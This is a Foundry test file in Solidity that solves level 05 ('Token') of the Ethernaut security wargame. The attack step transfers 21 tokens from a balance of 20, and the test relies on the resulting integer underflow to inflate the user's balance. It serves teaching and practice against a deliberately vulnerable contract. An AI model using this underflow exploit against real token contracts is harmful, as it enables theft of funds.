// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

import {Test, console} from "forge-std/Test.sol";
import {Ethernaut} from "../src/core/Ethernaut.sol";
import {TokenFactory} from "../src/05-Token/TokenFactory.sol";
import {Token} from "../src/05-Token/Token.sol";

contract TokenTest is Test {
    Ethernaut public ethernaut;
    address public user = vm.addr(1);

    function setUp() public {
        ethernaut = new Ethernaut();
    }

    function test_TokenAttack() public {
        // SETUP
        TokenFactory tokenFactory = new TokenFactory();
        ethernaut.registerLevel(tokenFactory);
        vm.startPrank(user);
        address levelAddress = ethernaut.createLevelInstance(tokenFactory);
        Token ethernautToken = Token(levelAddress);

        // ATTACK
        // Transfer 21 causing an underflow
        ethernautToken.transfer(address(100), 21);
        assertGt(ethernautToken.balanceOf(user), 20);

        // SUBMIT
        assertTrue(ethernaut.submitLevelInstance(payable(levelAddress)), "level not solved");
        vm.stopPrank();
    }
}
